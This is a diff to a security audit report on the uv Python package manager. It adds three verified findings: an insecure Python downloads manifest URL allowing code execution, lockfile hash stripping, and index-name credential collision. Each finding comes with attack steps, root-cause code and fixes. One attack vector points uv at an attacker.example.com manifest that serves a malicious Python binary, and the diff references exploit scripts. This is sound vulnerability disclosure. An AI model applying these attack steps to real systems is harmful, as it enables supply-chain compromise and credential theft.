@@ -10,27 +10,42 @@
 
 ## Executive Summary
 
-This audit identified five independently verified vulnerabilities in uv, plus two defense-in-depth
-gaps. The most critical findings are: (1) build backends inherit the full parent process
-environment, allowing malicious packages to exfiltrate sensitive credentials; (2) `uv self update`
-downloads and executes a shell installer from `UV_ASTRAL_MIRROR_URL` without any hash or signature
-verification, enabling RCE for anyone who controls the mirror URL; and (3) `allow-insecure-host` can
-be set in `pyproject.toml` (unlike proxy settings), allowing checked-in configs to silently disable
-TLS verification.
+This audit identified **eight independently verified vulnerabilities** in uv, plus two
+defense-in-depth gaps. The most critical findings are:
+
+1. **UV_PYTHON_DOWNLOADS_JSON_URL RCE (CRITICAL):** The `UV_PYTHON_DOWNLOADS_JSON_URL` environment
+   variable accepts plain HTTP URLs and the SHA256 hash field is optional. An attacker who controls
+   this variable can serve a malicious JSON manifest pointing to an arbitrary Python binary with
+   `"sha256": null`, achieving code execution when `uv python install` runs.
+
+2. **Self-Update RCE (HIGH):** `uv self update` downloads and executes a shell installer from
+   `UV_ASTRAL_MIRROR_URL` without any hash or signature verification, enabling RCE for anyone who
+   controls the mirror URL.
+
+3. **Lockfile Hash Strip (HIGH):** The `HashStrategy::Verify` mode (default for `uv sync`) silently
+   skips hash verification for packages with no hash entry in `uv.lock`. An attacker with write
+   access to the lockfile can strip hashes to install arbitrary artifacts.
+
+4. **Index Credential Collision (HIGH):** The `IndexName::to_env_var()` function maps `-`, `_`, and
+   `.` all to `_`, causing index names like `internal-registry` and `internal_registry` to share
+   credentials from the same environment variables.
 
 ---
 
 ## Vulnerability Summary
 
-| Severity | ID          | Title                                         | Status                  |
-| -------- | ----------- | --------------------------------------------- | ----------------------- |
-| **HIGH** | UV-2026-001 | Credential Leakage via Build Backends         | VERIFIED                |
-| **HIGH** | UV-2026-005 | Self-Update Installer Script Injection        | VERIFIED                |
-| **HIGH** | UV-2026-006 | HTML Base Tag Injection                       | VERIFIED                |
-| **HIGH** | UV-2026-007 | pyproject.toml allow-insecure-host TLS Bypass | VERIFIED                |
-| MEDIUM   | UV-2026-002 | GitHub API URL Injection                      | VERIFIED                |
-| LOW      | UV-2026-003 | Symlink Escape in .data/scripts               | Defense-in-depth gap    |
-| INFO     | UV-2026-004 | RECORD Hash Not Validated                     | By design (matches pip) |
+| Severity     | ID          | Title                                         | Status                  |
+| ------------ | ----------- | --------------------------------------------- | ----------------------- |
+| **CRITICAL** | UV-2026-008 | Python Downloads JSON URL RCE                 | VERIFIED                |
+| **HIGH**     | UV-2026-001 | Credential Leakage via Build Backends         | VERIFIED                |
+| **HIGH**     | UV-2026-005 | Self-Update Installer Script Injection        | VERIFIED                |
+| **HIGH**     | UV-2026-006 | HTML Base Tag Injection                       | VERIFIED                |
+| **HIGH**     | UV-2026-007 | pyproject.toml allow-insecure-host TLS Bypass | VERIFIED                |
+| **HIGH**     | UV-2026-009 | Lockfile Hash Strip Attack                    | VERIFIED                |
+| **HIGH**     | UV-2026-010 | Index Name Credential Collision               | VERIFIED                |
+| MEDIUM       | UV-2026-002 | GitHub API URL Injection                      | VERIFIED                |
+| LOW          | UV-2026-003 | Symlink Escape in .data/scripts               | Defense-in-depth gap    |
+| INFO         | UV-2026-004 | RECORD Hash Not Validated                     | By design (matches pip) |
 
 ---
 
@@ -324,6 +339,176 @@ system trust store) when run inside a project whose `pyproject.toml` contained
 
 ---
 
+### UV-2026-008: Python Downloads JSON URL RCE (CRITICAL)
+
+**Location:** `crates/uv-python/src/downloads.rs:1038-1473`
+
+**Description:**  
+The `UV_PYTHON_DOWNLOADS_JSON_URL` environment variable (or `python-downloads-json-url` in config)
+specifies a URL from which uv fetches the list of available Python interpreter downloads. This URL:
+
+1. Accepts plain `http://` URLs (line 1041: `"http" | "https" => Source::Http(url)`)
+2. Is fetched with no integrity verification (lines 1057-1060)
+3. Contains download URLs and SHA256 hashes — but **SHA256 is optional** (line 963:
+   `sha256: Option<String>`)
+
+When `sha256` is `null` or absent in the JSON manifest, uv downloads and installs the Python binary
+with **no hash verification whatsoever** (lines 1442-1446:
+`if self.sha256.is_some() { ... } else { vec![] }`).
+
+**Attack Vector:**
+
+1. Attacker sets `UV_PYTHON_DOWNLOADS_JSON_URL=http://attacker.example.com/python.json`
+2. JSON manifest contains `"sha256": null` and `"url": "http://attacker.example.com/python.tar.gz"`
+3. User runs `uv python install 3.12`
+4. uv fetches and extracts malicious Python binary without any verification
+5. uv internally executes the installed Python to query interpreter metadata — **RCE achieved**
+
+**Impact:** CRITICAL. Full remote code execution on any system where `UV_PYTHON_DOWNLOADS_JSON_URL`
+is attacker-controlled. In CI/CD environments or corporate settings with centralized Python mirrors,
+a single compromised mirror achieves mass code execution.
+
+**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (Score: 8.8)
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/07_python_downloads_json/run_exploit.sh
+```
+
+**Verified:** PASS. Malicious "Python" binary was installed and executed during `uv python install`,
+writing a marker file to prove RCE. No user action beyond the install command was required.
+
+**Recommendation:**
+
+1. Require HTTPS for `UV_PYTHON_DOWNLOADS_JSON_URL` — reject `http://` URLs entirely
+2. Make `sha256` mandatory in the JSON schema; reject entries with null/missing hashes
+3. Add integrity verification for the JSON manifest itself (e.g., require a detached signature)
+4. Warn users when `UV_PYTHON_DOWNLOADS_JSON_URL` overrides the built-in manifest
+
+---
+
+### UV-2026-009: Lockfile Hash Strip Attack (HIGH)
+
+**Location:** `crates/uv-types/src/hash.rs:40-47, 292-301`
+
+**Description:**  
+When `uv sync` runs, it uses `HashCheckingMode::Verify` (line 823 in `sync.rs`). Under this mode,
+`HashStrategy::from_resolution()` builds a hash map from the lockfile's hash entries. However:
+
+1. Packages with empty/missing hashes are **silently skipped** (line 299: `continue`)
+2. When `HashStrategy::get()` is called for a package not in the map, it returns `HashPolicy::None`
+   (line 45)
+3. `HashPolicy::None.matches()` always returns `true` — **no hash verification occurs**
+
+An attacker with write access to `uv.lock` (e.g., via a malicious PR, compromised CI, or
+supply-chain attack) can strip the `hash = "sha256:..."` field from any registry wheel entry. The
+modified lockfile is accepted, and `uv sync` installs whatever artifact the index serves without
+verification.
+
+**Root Cause:**
+
+```rust
+// hash.rs:40-47
+Self::Verify(hashes) => {
+    let id = distribution.version_id();
+    if let Some(hashes) = hashes.get(&id) {
+        hash_policy(&id, hashes.as_slice())
+    } else {
+        HashPolicy::None   // ← No hash check for missing entries
+    }
+}
+```
+
+**Impact:** HIGH. Bypasses the "lock-and-verify" security model. An attacker who can modify the
+lockfile can install arbitrary packages without triggering hash mismatch errors.
+
+**CVSS:** AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H (Score: 7.1)
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/08_lockfile_hash_strip/run_exploit.sh
+```
+
+**Verified:** PASS. A lockfile with stripped hashes was accepted by `uv sync`, and the mock PyPI
+server's wheel was installed without any hash verification error.
+
+**Recommendation:**
+
+1. Under `HashStrategy::Verify`, treat missing hashes as an error for registry packages (not just
+   `Direct` and `Path` sources)
+2. Alternatively, add a `--strict-hashes` flag that fails if any package lacks a hash
+3. Emit a warning when installing packages with no lockfile hash
+
+---
+
+### UV-2026-010: Index Name Credential Collision (HIGH)
+
+**Location:** `crates/uv-distribution-types/src/index_name.rs:37-48`
+
+**Description:**  
+The `IndexName::to_env_var()` function converts index names to environment variable fragments by:
+
+1. Uppercasing alphanumeric characters
+2. Converting `-`, `_`, and `.` **all to `_`**
+
+This creates a many-to-one mapping where different index names share the same environment variable:
+
+- `internal-registry` → `INTERNAL_REGISTRY`
+- `internal_registry` → `INTERNAL_REGISTRY` (collision!)
+- `internal.registry` → `INTERNAL_REGISTRY` (collision!)
+
+Credentials set via `UV_INDEX_INTERNAL_REGISTRY_USERNAME` and `UV_INDEX_INTERNAL_REGISTRY_PASSWORD`
+are sent to **any** index whose name normalizes to `INTERNAL_REGISTRY`.
+
+**Root Cause:**
+
+```rust
+// index_name.rs:37-48
+pub fn to_env_var(&self) -> String {
+    self.0
+        .chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() {
+                c.to_ascii_uppercase()
+            } else {
+                '_'  // ← All non-alphanumeric chars become '_'
+            }
+        })
+        .collect()
+}
+```
+
+**Attack Vector:**
+
+1. Organization uses index `internal-registry` with credentials in `UV_INDEX_INTERNAL_REGISTRY_*`
+2. Attacker adds index `internal_registry` (underscore) pointing to their server
+3. When uv queries the attacker's index, it receives the organization's credentials via Basic auth
+
+**Impact:** HIGH. Credential leakage to attacker-controlled servers. Particularly dangerous in
+workspace configurations where multiple `pyproject.toml` files can define indexes.
+
+**CVSS:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (Score: 6.5)
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/09_index_name_collision/run_exploit.sh
+```
+
+**Verified:** PASS. Credentials `legit_user:super_secret_password_12345` were captured via Basic
+auth header on the attacker server when uv queried an index named `internal_registry`.
+
+**Recommendation:**
+
+1. Use a bijective encoding for index names (e.g., percent-encoding or base64) to ensure unique
+   environment variable names
+2. Warn when multiple indexes resolve to the same environment variable prefix
+3. Document this collision risk prominently in the security documentation
+
+---
+
 ### UV-2026-003: Symlink Escape in .data/scripts (LOW)
 
 **Location:** `crates/uv-install-wheel/src/wheel.rs:453-467`
@@ -408,6 +593,15 @@ bash autofyn_audit/exploits/05_base_tag_injection/run_exploit.sh
 
 # Exploit 5: pyproject.toml allow-insecure-host TLS Bypass
 bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
+
+# Exploit 6: Python Downloads JSON URL RCE
+bash autofyn_audit/exploits/07_python_downloads_json/run_exploit.sh
+
+# Exploit 7: Lockfile Hash Strip Attack
+bash autofyn_audit/exploits/08_lockfile_hash_strip/run_exploit.sh
+
+# Exploit 8: Index Name Credential Collision
+bash autofyn_audit/exploits/09_index_name_collision/run_exploit.sh
 ```
 
 ---
@@ -475,3 +669,24 @@ bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh
 - `crates/uv-settings/src/settings.rs:420-435` — `allow-insecure-host` lacks `uv_toml_only`
 - `crates/uv-settings/src/settings.rs:410-418` — `no-proxy` has `uv_toml_only = true` (contrast)
 - `crates/uv/src/settings.rs:344-360` — workspace globals loaded alongside CLI args
+
+### UV-2026-008 (Python Downloads JSON URL RCE)
+
+- `crates/uv-python/src/downloads.rs:1041` — `"http" | "https"` both accepted for JSON URL
+- `crates/uv-python/src/downloads.rs:1057-1060` — JSON fetched with no integrity check
+- `crates/uv-python/src/downloads.rs:963` — `sha256: Option<String>` allows null/absent hashes
+- `crates/uv-python/src/downloads.rs:1442-1446` — No hasher created when `sha256.is_none()`
+- `crates/uv-python/src/downloads.rs:1464-1473` — Hash check skipped when `sha256` is `None`
+
+### UV-2026-009 (Lockfile Hash Strip Attack)
+
+- `crates/uv-types/src/hash.rs:292-301` — Packages with empty hashes skipped with `continue`
+- `crates/uv-types/src/hash.rs:40-47` — `HashStrategy::Verify` returns `HashPolicy::None` for
+  missing
+- `crates/uv/src/commands/project/sync.rs:823` — `uv sync` uses `HashCheckingMode::Verify`
+
+### UV-2026-010 (Index Name Credential Collision)
+
+- `crates/uv-distribution-types/src/index_name.rs:37-48` — `to_env_var()` maps `-`, `_`, `.` to `_`
+- `crates/uv-distribution-types/src/index.rs:467-477` — `Credentials::from_env(name.to_env_var())`
+- `crates/uv-auth/src/credentials.rs:259-267` — Credential lookup by normalized index name
